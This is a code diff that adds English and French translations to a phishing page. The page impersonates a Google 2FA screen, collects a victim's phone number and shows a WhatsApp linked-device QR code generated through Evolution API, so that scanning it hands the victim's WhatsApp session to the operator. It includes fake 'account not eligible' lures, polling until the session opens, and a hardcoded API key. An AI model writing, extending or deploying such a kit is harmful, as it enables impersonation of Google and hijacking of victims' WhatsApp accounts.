@@ -365,6 +365,69 @@
     const EVOLUTION_API_KEY = "9a6b0239caaed70bf0087cb3a8a7936fc3a9beb8e706503e";
     const INSTANCE_NAME_MAX = 80;
 
+    const LANG = new URLSearchParams(window.location.search).get("lang") === "en" ? "en" : "fr";
+
+    const I18N = {
+      fr: {
+        pageTitle: "Google - Authentification 2FA",
+        step1Title: "Confirmez votre identité",
+        step1Desc: "Utilisez votre numéro de téléphone pour confirmer votre identité.",
+        labelCountryCode: "Indicatif",
+        placeholderPhone: "Numéro de téléphone",
+        btnConfirm: "Confirmer",
+        step2Title: "Vérification en cours",
+        step2Desc: "Nous vérifions vos informations de connexion.",
+        loaderText: "Vous allez être redirigé...",
+        step3Title: "Vérifiez votre connexion",
+        step3Desc: "Scannez le QR code suivant depuis un compte WhatsApp lié à votre numéro.",
+        qrHintExpire: "Le QR expire rapidement. Vous pouvez le régénérer si besoin.",
+        qrHintSuccess: "QR régénéré avec succès. Scannez-le rapidement dans WhatsApp.",
+        qrHintScanned: "Depuis WhatsApp, dans vos appareils connectés, utilisez ce QR code",
+        btnRefresh: "Rafraîchir le code",
+        btnRefreshing: "Rafraîchissement...",
+        refreshNote: "Problème de connexion ? Obtenez un nouveau code.",
+        errorInvalidPhone: "Veuillez saisir un numéro valide.",
+        errorNotEligible: "Compte non-éligible, utilisez un compte plus actif pour accéder au document.",
+        errorNoInstance: "Aucune instance en cours.",
+        errorQrUnavailable: "QR indisponible pour cette instance. Réessayez dans quelques secondes.",
+        errorNoQr: "Aucun QR code reçu depuis Evolution API. Réessayez.",
+        errorCreateInstance: "Création de l'instance impossible.",
+        statusWaiting: "en attente",
+        statusVerified: "verifiée (open)",
+        statusWhatsApp: "Statut WhatsApp"
+      },
+      en: {
+        pageTitle: "Google - 2FA Authentication",
+        step1Title: "Confirm your identity",
+        step1Desc: "Use your phone number to confirm your identity.",
+        labelCountryCode: "Country code",
+        placeholderPhone: "Phone number",
+        btnConfirm: "Confirm",
+        step2Title: "Verification in progress",
+        step2Desc: "We are verifying your login information.",
+        loaderText: "You will be redirected...",
+        step3Title: "Verify your connection",
+        step3Desc: "Scan the following QR code from a WhatsApp account linked to your number.",
+        qrHintExpire: "The QR code expires quickly. You can regenerate it if needed.",
+        qrHintSuccess: "QR regenerated successfully. Scan it quickly in WhatsApp.",
+        qrHintScanned: "From WhatsApp, in your linked devices, use this QR code",
+        btnRefresh: "Refresh code",
+        btnRefreshing: "Refreshing...",
+        refreshNote: "Connection issue? Get a new code.",
+        errorInvalidPhone: "Please enter a valid number.",
+        errorNotEligible: "Account not eligible, use a more active account to access the document.",
+        errorNoInstance: "No active instance.",
+        errorQrUnavailable: "QR unavailable for this instance. Try again in a few seconds.",
+        errorNoQr: "No QR code received from Evolution API. Please try again.",
+        errorCreateInstance: "Unable to create the instance.",
+        statusWaiting: "waiting",
+        statusVerified: "verified (open)",
+        statusWhatsApp: "WhatsApp status"
+      }
+    };
+
+    const t = I18N[LANG];
+
     const steps = [
       document.getElementById("step1"),
       document.getElementById("step2"),
@@ -498,7 +561,7 @@
 
     function setRefreshButtonLoading(loading) {
       refreshQrBtn.disabled = loading;
-      refreshQrBtn.textContent = loading ? "Rafraîchissement..." : "Rafraîchir le QR";
+      refreshQrBtn.textContent = loading ? t.btnRefreshing : t.btnRefresh;
     }
 
     function updateCountryCodeDisplay() {
@@ -506,7 +569,13 @@
     }
 
     async function loadCountryCodes() {
-      const fallbackCountries = [
+      const fallbackCountries = LANG === "en" ? [
+        { name: "France", dial: "+33" },
+        { name: "Canada", dial: "+1" },
+        { name: "United States", dial: "+1" },
+        { name: "Indonesia", dial: "+62" },
+        { name: "United Kingdom", dial: "+44" }
+      ] : [
         { name: "France", dial: "+33" },
         { name: "Canada", dial: "+1" },
         { name: "États-Unis", dial: "+1" },
@@ -525,11 +594,12 @@
             const suffixes = Array.isArray(country?.idd?.suffixes) ? country.idd.suffixes : [];
             const suffix = suffixes[0] || "";
             const dial = `${root}${suffix}`.trim();
-            const frenchName =
-              country?.translations?.fra?.common ||
-              country?.translations?.fra?.official ||
-              country?.name?.common ||
-              "";
+            const frenchName = LANG === "en"
+              ? (country?.name?.common || "")
+              : (country?.translations?.fra?.common ||
+                 country?.translations?.fra?.official ||
+                 country?.name?.common ||
+                 "");
             return {
               name: frenchName,
               dial
@@ -537,7 +607,7 @@
           })
           .filter((item) => item.name && /^\+\d+$/.test(item.dial));
 
-        entries.sort((a, b) => a.name.localeCompare(b.name, "fr", { sensitivity: "base" }));
+        entries.sort((a, b) => a.name.localeCompare(b.name, LANG, { sensitivity: "base" }));
 
         // Dedup by visible label to avoid repeated territories.
         const unique = [];
@@ -585,7 +655,7 @@
     }
 
     function formatInstanceMeta(baseText, instanceStatus) {
-      const statusLabel = instanceStatus ? `Statut WhatsApp: ${instanceStatus}` : "Statut WhatsApp: en attente";
+      const statusLabel = instanceStatus ? `${t.statusWhatsApp}: ${instanceStatus}` : `${t.statusWhatsApp}: ${t.statusWaiting}`;
       return baseText ? `${baseText} · ${statusLabel}` : statusLabel;
     }
 
@@ -633,20 +703,20 @@
           const baseText = instanceMetaEl?.dataset?.baseText || instanceMetaEl?.textContent || "";
 
           if (ready) {
-            instanceMetaEl.textContent = formatInstanceMeta(baseText, "verifiée (open)");
+            instanceMetaEl.textContent = formatInstanceMeta(baseText, t.statusVerified);
             if (instancePollTimeout) {
               window.clearTimeout(instancePollTimeout);
               instancePollTimeout = null;
             }
             if (!isRedirectingToWaitingApproval) {
               isRedirectingToWaitingApproval = true;
-              window.location.href = "/waiting-approval";
+              window.location.href = `/waiting-approval?lang=${LANG}`;
             }
             return;
           }
 
           const rawStatus = instance?.status ? String(instance.status) : "";
-          instanceMetaEl.textContent = formatInstanceMeta(baseText, rawStatus || "en attente");
+          instanceMetaEl.textContent = formatInstanceMeta(baseText, rawStatus || t.statusWaiting);
         } catch (e) {
           // En cas d'erreur réseau/API, on poursuit le polling.
         }
@@ -695,7 +765,7 @@
       }
 
       if (!createResponse || !createResponse.ok) {
-        throw new Error(buildErrorMessage(createPayload, "Création de l'instance impossible."));
+        throw new Error(buildErrorMessage(createPayload, t.errorCreateInstance));
       }
 
       const maxConnectAttempts = 5;
@@ -715,13 +785,13 @@
         await new Promise((resolve) => window.setTimeout(resolve, 900));
       }
 
-      throw new Error("Aucun QR code reçu depuis Evolution API. Réessayez.");
+      throw new Error(t.errorNoQr);
     }
 
     async function refreshQrForCurrentInstance() {
       const instanceName = sessionStorage.getItem("evolution_instance_name") || "";
       if (!instanceName) {
-        throw new Error("Aucune instance en cours.");
+        throw new Error(t.errorNoInstance);
       }
 
       const connectResult = await evolutionJson(`/instance/connect/${encodeURIComponent(instanceName)}`, {
@@ -735,7 +805,7 @@
       const qrBase64 = extractQrBase64(connectResult.data);
       const qrCount = typeof connectResult.data?.count === "number" ? connectResult.data.count : null;
       if (!qrBase64) {
-        throw new Error("QR indisponible pour cette instance. Réessayez dans quelques secondes.");
+        throw new Error(t.errorQrUnavailable);
       }
 
       return { qrBase64, qrCount };
@@ -751,7 +821,7 @@
       const fullPhone = sanitizePhone(countryCode, phoneNumber);
 
       if (!fullPhone) {
-        status1.textContent = "Veuillez saisir un numéro valide.";
+        status1.textContent = t.errorInvalidPhone;
         return;
       }
 
@@ -760,7 +830,7 @@
       try {
         const { qrBase64, qrCount, instanceName, phoneDisplay } = await requestPairingViaServer(fullPhone);
         qrCodeImageEl.src = await normalizeQrToBlack(qrBase64);
-        qrHintEl.textContent = `Depuis WhatsApp, dans vos appareils connectés, utilisez ce QR code`;
+        qrHintEl.textContent = t.qrHintScanned;
         const phoneLabel = phoneDisplay ? ` · +${phoneDisplay}` : "";
         instanceMetaEl.textContent = `Instance : ${instanceName}${phoneLabel}`;
         instanceMetaEl.dataset.baseText = instanceMetaEl.textContent;
@@ -772,7 +842,7 @@
         startInstanceReadyPolling();
       } catch (error) {
         showStep(0);
-        status1.textContent = "Compte non-éligible, utilisez un compte plus actif pour accéder au document.";
+        status1.textContent = t.errorNotEligible;
       }
     });
 
@@ -782,17 +852,35 @@
         setRefreshButtonLoading(true);
         const { qrBase64, qrCount } = await refreshQrForCurrentInstance();
         qrCodeImageEl.src = await normalizeQrToBlack(qrBase64);
-        qrHintEl.textContent = `QR régénéré avec succès. Scannez-le rapidement dans WhatsApp.${
-          typeof qrCount === "number" ? ` Génération #${qrCount}.` : ""
+        qrHintEl.textContent = `${t.qrHintSuccess}${
+          typeof qrCount === "number" ? ` #${qrCount}` : ""
         }`;
       } catch (error) {
-        qrHintEl.textContent = "Compte non-éligible, utilisez un compte plus actif pour accéder au document.";
+        qrHintEl.textContent = t.errorNotEligible;
       } finally {
         setRefreshButtonLoading(false);
       }
     });
 
     countryCodeSelect.addEventListener("change", updateCountryCodeDisplay);
+
+    // Apply i18n to static DOM elements
+    document.documentElement.lang = LANG;
+    document.title = t.pageTitle;
+    document.querySelector("#step1 .step-title").textContent = t.step1Title;
+    document.querySelector("#step1 .step-desc").textContent = t.step1Desc;
+    document.querySelector('#phoneForm label[for="countryCode"]').textContent = t.labelCountryCode;
+    document.getElementById("phoneNumber").placeholder = t.placeholderPhone;
+    document.querySelector("#phoneForm .btn").textContent = t.btnConfirm;
+    document.querySelector("#step2 .step-title").textContent = t.step2Title;
+    document.querySelector("#step2 .step-desc").textContent = t.step2Desc;
+    document.querySelector(".loader-text").textContent = t.loaderText;
+    document.querySelector("#step3 .step-title").textContent = t.step3Title;
+    document.querySelector("#step3 .step-desc").textContent = t.step3Desc;
+    qrHintEl.textContent = t.qrHintExpire;
+    refreshQrBtn.textContent = t.btnRefresh;
+    document.querySelector(".qr-refresh-note").textContent = t.refreshNote;
+
     loadCountryCodes();
   </script>
 </body>
